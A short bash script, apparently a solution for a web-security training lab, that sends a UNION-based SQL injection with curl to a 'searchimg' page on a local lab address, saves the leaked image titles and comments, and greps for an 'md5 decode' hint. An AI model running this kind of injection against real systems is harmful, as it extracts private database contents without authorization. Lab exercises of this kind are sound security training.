#!/bin/bash

echo input the IP address to inspect \(default IP address 192.168.56.3\):
read ip
# 192.168.56.3

if [ -z ${ip} ];
then
  ip="192.168.56.3"
fi

# echo "${ip}"
url="http://"${ip}"/?page=searchimg"
# echo "${url}"

response=$(curl -s -G -d "id=1 UNION SELECT title, comment FROM Member_images.list_images" -d "Submit=Submit" "$url")
echo "${response}" > 1.html
open 1.html
response=$(curl -s -G -d "id=1 UNION SELECT title, comment FROM Member_images.list_images" -d "Submit=Submit" "$url" | grep "md5 decode")
echo "${response}" > 2.html
open 2.html
